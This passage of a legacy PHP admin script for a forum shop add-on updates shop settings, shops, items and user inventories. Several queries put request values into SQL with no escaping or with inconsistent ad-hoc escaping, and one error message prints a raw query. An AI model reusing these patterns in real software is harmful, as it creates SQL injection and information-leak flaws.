	if ( isset($HTTP_GET_VARS['shopdiscard']) || isset($HTTP_POST_VARS['shopdiscard']) ) { $shopdiscard = ( isset($HTTP_POST_VARS['shopdiscard']) ) ? $HTTP_POST_VARS['shopdiscard'] : $HTTP_GET_VARS['shopdiscard']; }
	else { $shopdiscard = ''; }
	if ( isset($HTTP_GET_VARS['orderby']) || isset($HTTP_POST_VARS['orderby']) ) { $orderby = ( isset($HTTP_POST_VARS['orderby']) ) ? $HTTP_POST_VARS['orderby'] : $HTTP_GET_VARS['orderby']; }
	else { $orderby = ''; }
	if ( isset($HTTP_GET_VARS['viewtopic']) || isset($HTTP_POST_VARS['viewtopic']) ) { $viewtopic = ( isset($HTTP_POST_VARS['viewtopic']) ) ? $HTTP_POST_VARS['viewtopic'] : $HTTP_GET_VARS['viewtopic']; }
	else { $viewtopic = ''; }
	if ( isset($HTTP_GET_VARS['profiledisplay']) || isset($HTTP_POST_VARS['profiledisplay']) ) { $profiledisplay = ( isset($HTTP_POST_VARS['profiledisplay']) ) ? $HTTP_POST_VARS['profiledisplay'] : $HTTP_GET_VARS['profiledisplay']; }
	else { $profiledisplay = ''; }
	if ( isset($HTTP_GET_VARS['inventorytype']) || isset($HTTP_POST_VARS['inventorytype']) ) { $inventorytype = ( isset($HTTP_POST_VARS['inventorytype']) ) ? $HTTP_POST_VARS['inventorytype'] : $HTTP_GET_VARS['inventorytype']; }
	else { $inventorytype = ''; }
	if ( isset($HTTP_GET_VARS['topicdisplaynum']) || isset($HTTP_POST_VARS['topicdisplaynum']) ) { $topicdisplaynum = ( isset($HTTP_POST_VARS['topicdisplaynum']) ) ? intval($HTTP_POST_VARS['topicdisplaynum']) : intval($HTTP_GET_VARS['topicdisplaynum']); }
	else { $topicdisplaynum = ''; }
	if ( isset($HTTP_GET_VARS['invlimit']) || isset($HTTP_POST_VARS['invlimit']) ) { $invlimit = ( isset($HTTP_POST_VARS['invlimit']) ) ? intval($HTTP_POST_VARS['invlimit']) : intval($HTTP_GET_VARS['invlimit']); }
	else { $invlimit = '0'; }
	if ( isset($HTTP_GET_VARS['sellrate']) || isset($HTTP_POST_VARS['sellrate']) ) { $sellrate = ( isset($HTTP_POST_VARS['sellrate']) ) ? intval($HTTP_POST_VARS['sellrate']) : intval($HTTP_GET_VARS['sellrate']); }
	else { $sellrate = ''; }
	if ( isset($HTTP_GET_VARS['shopowners']) || isset($HTTP_POST_VARS['shopowners']) ) { $shopowners = ( isset($HTTP_POST_VARS['shopowners']) ) ? $HTTP_POST_VARS['shopowners'] : $HTTP_GET_VARS['shopowners']; }
	else { $shopowners = ''; }
	if ( isset($HTTP_GET_VARS['pointsname']) || isset($HTTP_POST_VARS['pointsname']) ) { $pointsname = ( isset($HTTP_POST_VARS['pointsname']) ) ? $HTTP_POST_VARS['pointsname'] : $HTTP_GET_VARS['pointsname']; }
	else { $pointsname = ''; }

	$shopdistricts = ( ($shopdistricts != 'on') && ($shopdistricts != 'off')) ? $board_config['shop_districts'] : $shopdistricts;
	$multiitems = ( ($multiitems != 'on') && ($multiitems != 'off') ) ? $board_config['multibuys'] : $multiitems;
	$shoprestock = ( ($shoprestock != 'on') && ($shoprestock != 'off') ) ? $board_config['restocks'] : $shoprestock;
	$shoptrade = ( ($shoptrade != 'on') && ($shoptrade != 'off') ) ? $board_config['shop_trade'] : $shoptrade;
	$shopgive = ( ($shopgive != 'on') && ($shopgive != 'off')) ? $board_config['shop_give'] : $shopgive;
	$shopdiscard = ( ($shopdiscard != 'on') && ($shopdiscard != 'off')) ? $board_config['shop_discard'] : $shopdiscard;
	$orderby = ( ($orderby != 'name') && ($orderby != 'cost') && ($orderby != 'id') ) ? $board_config['shop_orderby'] : $orderby;
	$viewtopic = ( ($viewtopic != 'images') && ($viewtopic != 'link') ) ? $board_config['viewtopic'] : $viewtopic;
	$profiledisplay = ( ($profiledisplay != 'images') && ($profiledisplay != 'link') && ($profiledisplay != 'none') ) ? $board_config['viewprofile'] : $profiledisplay;
	$inventorytype = ( ($inventorytype != 'grouped') && ($inventorytype != 'normal') ) ? $board_config['viewinventory'] : $inventorytype;
	$topicdisplaynum = ( ($topicdisplaynum < 0) || (empty($topicdisplaynum)) ) ? $board_config['viewtopiclimit'] : $topicdisplaynum;
	$invlimit = ( ($invlimit < 0) ) ? $board_config['shop_invlimit'] : $invlimit;
	$sellrate = ( (empty($sellrate)) || ($sellrate < 0) || ($sellrate > 100) ) ? $board_config['sellrate'] : $sellrate;
	$shopowners = ( ($shopowners != 'on') && ($shopowners != 'off')) ? $board_config['shop_owners'] : $shopowners;

	if ( ($shoprestock == "on") && ($board_config['restocks'] == 'off') ) 
	{
		$sql = "UPDATE " . SHOP_TABLE . "
			SET restockedtime = " . time();
		if ( !($db->sql_query($sql)) ) { message_die(CRITICAL_ERROR, 'SQL Error updating restock time for shops!'); }
	}
	elseif ( ($shoprestock == "off") && ($board_config['restocks'] == 'on') ) 
	{
		$sql = "UPDATE " . SHOP_TABLE . "
			set restockedtime = 0";
		if ( !($db->sql_query($sql)) ) { message_die(CRITICAL_ERROR, 'SQL Error disabling restock time for shops!'); }
	}
 
	$getarray = array();
	$getarray[] = "shop_districts";
	$getarray[] = "multibuys";
	$getarray[] = "restocks";
	$getarray[] = "sellrate";
	$getarray[] = "viewtopic";
	$getarray[] = "viewprofile";
	$getarray[] = "viewinventory";
	$getarray[] = "viewtopiclimit";
	$getarray[] = "shop_orderby";
	$getarray[] = "shop_give";
	$getarray[] = "shop_trade";
	$getarray[] = "shop_discard";
	$getarray[] = "shop_invlimit";
	$getarray[] = "points_name";
	$getarray[] = "shop_owners";
	$getarray2 = array();
	$getarray2[] = $shopdistricts;
	$getarray2[] = $multiitems;
	$getarray2[] = $shoprestock;
	$getarray2[] = $sellrate;
	$getarray2[] = $viewtopic;
	$getarray2[] = $profiledisplay;
	$getarray2[] = $inventorytype;
	$getarray2[] = $topicdisplaynum;
	$getarray2[] = $orderby;
	$getarray2[] = $shopgive;
	$getarray2[] = $shoptrade;
	$getarray2[] = $shopdiscard;
	$getarray2[] = $invlimit;
	$getarray2[] = $pointsname;
	$getarray2[] = $shopowners;
	$getarraynum = count($getarray);

	$globals = array();
	for($i = 0; $i < $getarraynum; $i++)
	{
		if ( $board_config[$getarray[$i]] != $getarray2[$i] )
		{
			$gsql = "UPDATE " . CONFIG_TABLE . "
				SET config_value = '$getarray2[$i]'
				WHERE config_name = '$getarray[$i]'";
			if ( !($result = $db->sql_query($gsql)) ) { message_die(CRITICAL_ERROR, 'ERROR: Getting Global Variables!'); }
		}
	}

	// Transaction Code!
	$sql = "INSERT
		INTO " . TRANS_TABLE . "
		 (user_id, type, action, value, timestamp, ip) 
		values({$userdata['user_id']}, 'shop_admin', 'global_update', '" . str_replace("'", "''", $userdata['username']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code for shop global update!'); }


	$message = $lang['ashop_global_updated'] . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
	message_die(GENERAL_MESSAGE, $message);
}


//edit shop
elseif ( $action == 'editshop' )
{
	if ( isset($HTTP_GET_VARS['shopid']) || isset($HTTP_POST_VARS['shopid']) ) { $shopid = ( isset($HTTP_POST_VARS['shopid']) ) ? intval($HTTP_POST_VARS['shopid']) : intval($HTTP_GET_VARS['shopid']); }
	else { $shopid = ''; }

	$template->set_filenames(array(
		'body' => 'admin/shop_edit_shop.tpl')
	);
	//check shopname

	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE id = $shopid";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error selecting shop information for shop editting!');
	}
	if ( !($db->sql_numrows($result)) )
	{
		message_die(GENERAL_MESSAGE, $lang['shop_doesnt_exist']);
	}
	else
	{
		$row = $db->sql_fetchrow($result);
	}

	//get shop items
	$sql = "SELECT *
		FROM " . SHOP_ITEMS_TABLE . "
		WHERE shop = '" . str_replace("'", "''", $row['shopname']) . "'";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error selecting item list from shop for shop editting!');
	}

	$sql_count = $db->sql_numrows($result);
	for ($i = 0; $i < $sql_count; $i++)
	{
		$irow = $db->sql_fetchrow($result);

		$template->assign_block_vars('list_shop_items', array(
			'ID' => $irow['id'],
			'NAME' => $irow['name'])
		);
	}

	if ( !($sql_count) )
	{
		$template->assign_block_vars('switch_no_items', array());
	}
	else
	{
		$template->assign_block_vars('switch_has_items', array());
	}

	//
	//begin template variable creation
	//

	//finish template varibable

	$template->assign_vars(array(
		'SHOP_ID' => $row['id'],
		'SHOP_NAME' => $row['shopname'],
		'SHOP_OWNER' => $row['shop_owner'],
		'SHOP_TYPE' => $row['shoptype'],
		'SHOP_DTYPE' => $row['d_type'],
		'SHOP_DISTRICT' => $row['district'],
		'RESTOCK_TIME' => $row['restocktime'],
		'RESTOCK_AMOUNT' => $row['restockamount'],
		'SHOP_MAIN_TEMPLATE' => $row['template'],
		'SHOP_ITEM_TEMPLATE' => $row['item_template'],

		'S_CONFIG_ACTION' => append_sid('admin_shop.' . $phpEx),

		'L_TABLE_TITLE' => $lang['ashop_cs_create'],
		'L_TABLE_TITLE2' => $lang['ashop_cs_table'],
		'L_SHOP_NAME' => $lang['ashop_cs_s_name'],
		'L_SHOP_OWNER' => $lang['ashop_cs_s_owner'],
		'L_SHOP_TYPE' => $lang['ashop_cs_s_type'],
		'L_DISTRICT_TYPE' => $lang['ashop_cs_d_type'],
		'L_DISTRICT_NUM' => $lang['ashop_cs_d_num'],
		'L_RESTOCK_TIME' => $lang['ashop_cs_res_time'],
		'L_RESTOCK_AMT' => $lang['ashop_cs_res_amt'],
		'L_MAIN_TEMPLATE' => $lang['ashop_cs_m_tpl'],
		'L_ITEM_TEMPLATE' => $lang['ashop_cs_i_tpl'],
		'L_UPDATE_SHOP' => $lang['ashop_cs_update'],
		'L_DELETE_SHOP' => $lang['ashop_cs_delete'],
		'L_NO_ITEMS' => $lang['ashop_cs_no_items'],
		'L_EDIT_ITEM' => $lang['ashop_cs_edit'],
		'L_ITEM_NAME' => $lang['ashop_cs_name'],
		'L_SHORT_DESC' => $lang['ashop_cs_s_desc'],
		'L_LONG_DESC' => $lang['ashop_cs_l_desc'],
		'L_PRICE' => $lang['ashop_cs_price'],
		'L_STOCK' => $lang['ashop_cs_stock'],
		'L_MAX_STOCK' => $lang['ashop_cs_maxstock'],
		'L_ADD_ITEM' => $lang['ashop_cs_add'],
		'L_SHOPTITLE' => $lang['ashop_cs_table2'],
		'L_SHOPEXPLAIN' => $lang['ashop_cs_explain']
	));
}

//edit item
elseif ( $action == 'edititem' )
{
	if ( isset($HTTP_GET_VARS['itemid']) || isset($HTTP_POST_VARS['itemid']) ) { $itemid = ( isset($HTTP_POST_VARS['itemid']) ) ? intval($HTTP_POST_VARS['itemid']) : intval($HTTP_GET_VARS['itemid']); }
	else { $itemid = ''; }

	$template->set_filenames(array(
		'body' => 'admin/shop_edit_item.tpl')
	);
	//check itemname
	$sql = "sELECT *
		FROM " . SHOP_ITEMS_TABLE . "
		WHERE id = $itemid";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error selecting item information for item editting!');
	}

	if ( !($db->sql_numrows($result)) )
	{
		message_die(GENERAL_MESSAGE, $lang['no_item_exists']);
	}
	else
	{
		$row = $db->sql_fetchrow($result);
	}

	if ( $row['shop'] == 'Synthesize Shop' )
	{
		$template->assign_block_vars('synth_shop', array(
			'SYNTH_INFO' => $row['synth'])
		);
	}

	$sql = "SELECT a.*, b.username
		FROM " . USER_ITEMS_TABLE . " as a, " . USERS_TABLE . " as b
		WHERE item_id = $itemid
			AND a.user_id = b.user_id";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error selecting user owned list for item editting!');
	}
	$sql_count = $db->sql_numrows($result);

	for ( $i = 0; $i < $sql_count; $i++)
	{
		$irow = $db->sql_fetchrow($result);

		$template->assign_block_vars('list_users', array(
			'USER_ID' => $irow['user_id'],
			'USERNAME' => $irow['username'])
		);		
	}

	if ( $sql_count )
	{
		$template->assign_block_vars('user_owned', array());
	}

	//finish template varibable
	//
	//parse template variables
	$template->assign_vars(array(
		'ITEM_ID' => $row['id'],
		'ITEM_NAME' => $row['name'],
		'ITEM_SHOP' => $row['shop'],
		'ITEM_SDESC' => $row['sdesc'],
		'ITEM_LDESC' => $row['ldesc'],
		'ITEM_COST' => $row['cost'],
		'ITEM_STOCK' => $row['stock'],
		'ITEM_MAX_STOCK' => $row['maxstock'],
		'ITEM_SOLD' => $row['sold'],
		'ITEM_FORUM' => $row['accessforum'],
		'ITEM_SPECIAL_LINK' => htmlspecialchars($row['special_link']),

		'S_CONFIG_ACTION' => append_sid('admin_shop.' . $phpEx),

		'L_SHOPTABLETITLE' => $lang['ashop_modify'] . ' ' . $row['name'],
		'L_ITEM_NAME' => $lang['ashop_cs_name'],
		'L_SHOP_NAME' => $lang['ashop_cs_sname'],
		'L_SHORT_DESC' => $lang['ashop_cs_s_desc'],
		'L_LONG_DESC' => $lang['ashop_cs_l_desc'],
		'L_PRICE' => $lang['ashop_cs_price'],
		'L_STOCK' => $lang['ashop_cs_stock'],
		'L_MAX_STOCK' => $lang['ashop_cs_maxstock'],
		'L_SOLD' => $lang['ashop_cs_sold'],
		'L_ACCESS_ID' => $lang['ashop_cs_forumid'],
		'L_SPECIAL_LINK' => $lang['ashop_cs_slink'],
		'L_UPDATE_ITEM' => $lang['ashop_cs_uitem'],
		'L_DELETE_ITEM' => $lang['ashop_cs_ditem'],
		'L_OWNED_BY' => $lang['ashop_cs_ownedby'],
		'L_EDIT_INV' => $lang['ashop_cs_editinv'],
		'L_SHOPTITLE' => $lang['ashop_cs_shopeditor'],
		'L_SHOPEXPLAIN' => $lang['ashop_cs_explain2']

	));
}

//edit users inventories
elseif ( $action == 'editinventory' )
{
	if ( isset($HTTP_GET_VARS['username']) || isset($HTTP_POST_VARS['username']) ) { $username = ( isset($HTTP_POST_VARS['username']) ) ? $HTTP_POST_VARS['username'] : $HTTP_GET_VARS['username']; }
	else { $username = ''; }

	$template->set_filenames(array(
		'body' => 'admin/shop_edit_user.tpl')
	);
	//check username & get useritems
	$user_row = get_userdata(stripslashes($username));
	if ( strlen($user_row['username']) < 3 ) { message_die(GENERAL_MESSAGE, $lang['shop_no_user']); }

	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE user_id = " . $user_row['user_id'];
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error getting user items!');
	}

	$sql_count = $db->sql_numrows($result);
     	for ($i = 0; $i < $sql_count; $i++)
	{
		$row = $db->sql_fetchrow($result);

		$template->assign_block_vars('list_user_items', array(
			'ID' => $row['id'],
			'ITEM_NAME' => $row['item_name'])
		);

	}
	if ( !($sql_count) )
	{
		$template->assign_block_vars('list_user_items', array(
			'ID' => 0,
			'ITEM_NAME' => $lang['nothing'])
		);
	}

	//get all items
	$sql = "SELECT `id`, `name`
		FROM " . SHOP_ITEMS_TABLE . "
		ORDER BY `name`";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'Fatal Error Getting All Items!');
	}

	$sql_count = $db->sql_numrows($result);
  	for ($i = 0; $i < $sql_count; $i++)
  	{
		$row = $db->sql_fetchrow($result);

		$template->assign_block_vars('list_shop_items', array(
			'ID' => $row['id'],
			'ITEM_NAME' => $row['name'])
		);
	}
	
	//parse template variables
	$template->assign_vars(array(
		'USER_ID' => $user_row['user_id'],

		'S_CONFIG_ACTION' => append_sid('admin_shop.' . $phpEx),

		'L_DELETE_ITEM' => $lang['ashop_i_delete'],
		'L_ADD_ITEM' => $lang['ashop_i_add'],
		'L_CLEAR_ITEMS' => $lang['ashop_i_clear'],
		'L_DELETE_INV' => $lang['ashop_i_deleteinv'],
		'L_CUSTOM_ITEM' => $lang['ashop_i_custom'],
		'L_ITEM_NAME' => $lang['ashop_i_name'],
		'L_ITEM_ID' => $lang['ashop_i_id'],
		'L_SHORT_DESC' => $lang['ashop_i_s_desc'],
		'L_LONG_DESC' => $lang['ashop_i_l_desc'],
		'L_SHOPTABLETITLE' => sprintf($lang['ashop_i_modify'], $user_row['username']),
		'L_SHOPTITLE' => $lang['ashop_i_editor'],
		'L_SHOPEXPLAIN' => $lang['ashop_i_explain']
	));
}

//update users inventories
elseif ( $action == 'updateinv' )
{
	if ( isset($HTTP_GET_VARS['username']) || isset($HTTP_POST_VARS['username']) ) { $username = ( isset($HTTP_POST_VARS['username']) ) ? intval($HTTP_POST_VARS['username']) : intval($HTTP_GET_VARS['username']); }
	else { $username = ''; }
	if ( isset($HTTP_GET_VARS['subaction']) || isset($HTTP_POST_VARS['subaction']) ) { $subaction = ( isset($HTTP_POST_VARS['subaction']) ) ? $HTTP_POST_VARS['subaction'] : $HTTP_GET_VARS['subaction']; }
	else { $subaction = ''; }
	if ( isset($HTTP_GET_VARS['itemname']) || isset($HTTP_POST_VARS['itemname']) ) { $itemname = ( isset($HTTP_POST_VARS['itemname']) ) ? intval($HTTP_POST_VARS['itemname']) : intval($HTTP_GET_VARS['itemname']); }
	else { $itemname = ''; }

	//check username
	$user_row = get_userdata($username);
	if ( empty($user_row['username']) ) { message_die(GENERAL_MESSAGE, $lang['shop_no_user']); }

	if ( $subaction == 'delete' )
	{
		#
		# Make sure user has item!
		#
		$sql = "SELECT *
			FROM " . USER_ITEMS_TABLE . "
			WHERE id = $itemname";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Error selecting user items!');
		}
		if ( !($db->sql_numrows($result)) ) { message_die(GENERAL_MESSAGE, $lang['ashop_user_no_item']); }
		else { $row = $db->sql_fetchrow($result); }

		$sql = "DELETE FROM " . USER_ITEMS_TABLE . "
			WHERE id = $itemname
				AND user_id = {$user_row['user_id']}";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Error for deleting item from user!');
		}

		// Transaction Code!
		$sql = "INSERT
			INTO " . TRANS_TABLE . "
			(user_id, target_id, target_name, type, action, value, timestamp, ip)
			values({$userdata['user_id']}, {$user_row['user_id']}, '" . str_replace("\'", "''", $username) . "', 'shop_admin', 'del_item', '" . str_replace("'", "''", $row['item_name']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
		if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code for inventory update!'); }

		$message = sprintf($lang['ashop_user_item_deleted'], $row['item_name'], str_replace("s's", "s'", $user_row['username'] . "'s")) . '<br /><br />' . sprintf($lang['ashop_click_inventory'], '<a href="'.append_sid("admin_shop.".$phpEx."?username=" . $user_row['user_id'] . "&action=editinventory").'">','</a>', str_replace("s's", "s'", $user_row['username'] . "'s")) . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
		message_die(GENERAL_MESSAGE, $message);
	}
	elseif ( $subaction == 'add' )
	{
		$sql = "SELECT *
			FROM " . SHOP_ITEMS_TABLE . "
			WHERE id = '$itemname'";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Error selecting item list from shop for user inventory editting!');
		}
		if ( !($db->sql_numrows($result)) ) { message_die(GENERAL_MESSAGE, $lang['no_item_exists']); }
		else { $row = $db->sql_fetchrow($result); }

		$sql = "INSERT INTO " . USER_ITEMS_TABLE . "
			(user_id, item_id, item_name, item_s_desc, item_l_desc)
			VALUES({$user_row['user_id']}, {$row['id']}, '" . str_replace("'", "''", $row['name']) . "', '" . str_replace("'", "''", $row['sdesc']) . "', '" . str_replace("'", "''", $row['ldesc']) . "')";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Error adding item to user in user inventory editting!');
		}

		// Transaction Code!
		$sql = "INSERT
			INTO " . TRANS_TABLE . "
			(user_id, target_id, target_name, type, action, value, timestamp, ip)
			values({$userdata['user_id']}, {$user_row['user_id']}, '" . str_replace("'", "''", $user_row['username']) . "', 'shop_admin', 'add_item', '" . str_replace("'", "''", $row['itemname']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
		if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code for adding item to user inventory!'); }

		$message = sprintf($lang['ashop_user_item_added'], $row['name'], str_replace("s's", "s'", $user_row['username'] . "'s")) . '<br /><br />' . sprintf($lang['ashop_click_inventory'], '<a href="'.append_sid("admin_shop.".$phpEx."?username=" . $user_row['user_id'] . "&action=editinventory").'">','</a>', str_replace("s's", "s'", $user_row['username'] . "'s")) . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
		message_die(GENERAL_MESSAGE, $message);
	}
	elseif ( $subaction == 'unique_item' )
	{
		if ( isset($HTTP_GET_VARS['item_name']) || isset($HTTP_POST_VARS['item_name']) ) { $item_name = ( isset($HTTP_POST_VARS['item_name']) ) ? $HTTP_POST_VARS['item_name'] : $HTTP_GET_VARS['item_name']; }
		else { $item_name = ''; }
		if ( isset($HTTP_GET_VARS['item_id']) || isset($HTTP_POST_VARS['item_id']) ) { $item_id = ( isset($HTTP_POST_VARS['item_id']) ) ? intval($HTTP_POST_VARS['item_id']) : intval($HTTP_GET_VARS['item_id']); }
		else { $item_id = '-1'; }
		if ( isset($HTTP_GET_VARS['item_sdesc']) || isset($HTTP_POST_VARS['item_sdesc']) ) { $item_sdesc = ( isset($HTTP_POST_VARS['item_sdesc']) ) ? $HTTP_POST_VARS['item_sdesc'] : $HTTP_GET_VARS['item_sdesc']; }
		else { $item_sdesc = ''; }
		if ( isset($HTTP_GET_VARS['item_ldesc']) || isset($HTTP_POST_VARS['item_ldesc']) ) { $item_ldesc = ( isset($HTTP_POST_VARS['item_ldesc']) ) ? $HTTP_POST_VARS['item_ldesc'] : $HTTP_GET_VARS['item_ldesc']; }
		else { $item_ldesc = ''; }

		if ( empty($item_name) ) { $error .= 'You must set an item name!<br /><br />'; }
		if ( empty($item_sdesc) ) { $error .= 'You must set a short description!<br /><br />'; }
		if ( empty($item_ldesc) ) { $error .= 'You must set a long description!<br /><br />'; }

		$sql = "INSERT INTO " . USER_ITEMS_TABLE . " 
			(user_id, item_id, item_name, item_s_desc, item_l_desc)
			VALUES({$user_row['user_id']}, $item_id, '" . str_replace("\'", "''", $item_name) . "', '" . str_replace("\'", "''", $item_sdesc) . "', '" . str_replace("\'", "''", $item_ldesc) . "')";

		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'Fatal Error: ' . $sql);
		}

		// Transaction Code!
		$sql = "INSERT
			INTO " . TRANS_TABLE . "
			(user_id, target_id, target_name, type, action, value, timestamp, ip)
			values({$userdata['user_id']}, {$user_row['user_id']}, '" . str_replace("'", "''", $user_row['username']) . "', 'shop_admin', 'unique_item', '" . str_replace("\'", "''", $item_name) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
		if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code for unqiue item creation!'); }

		$message = sprintf($lang['ashop_user_item_added'], stripslashes($item_name), str_replace("s's", "s'", $user_row['username'] . "'s")) . '<br /><br />' . sprintf($lang['ashop_click_inventory'], '<a href="'.append_sid("admin_shop.".$phpEx."?username=" . $user_row['user_id'] . "&action=editinventory").'">','</a>', str_replace("s's", "s'", $user_row['username'] . "'s")) . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
		message_die(GENERAL_MESSAGE, $message);
	}
	elseif ( $subaction == 'clear' )
	{
		$sql = "DELETE FROM " . USER_ITEMS_TABLE . "
			WHERE user_id = {$user_row['user_id']}";
		if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error for wiping user inventory!'); }

		// Transaction Code!
		$sql = "INSERT
			INTO " . TRANS_TABLE . "
			(user_id, target_id, target_name, type, action, value, timestamp, ip)
			values({$userdata['user_id']}, {$row['user_id']}, '" . str_replace("\'", "''", $username) . "', 'shop_admin', 'clear_item', 'cleared!', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
		if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error in adding transaction code for wiping user inventory!'); }

		$message = sprintf($lang['ashop_user_items_cleared'], str_replace("s's", "s'", $user_row['username'] . "'s")) . '<br /><br />' . sprintf($lang['ashop_click_inventory'], '<a href="'.append_sid("admin_shop.".$phpEx."?username=" . $user_row['user_id'] . "&action=editinventory").'">','</a>', str_replace("s's", "s'", $user_row['username'] . "'s")) . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
		message_die(GENERAL_MESSAGE, $message);
	}
}

else { message_die(GENERAL_MESSAGE, $lang['invalid_command']); }

//
// Generate the page
//
$template->pparse('body');

include('page_footer_admin.' . $phpEx);


?>
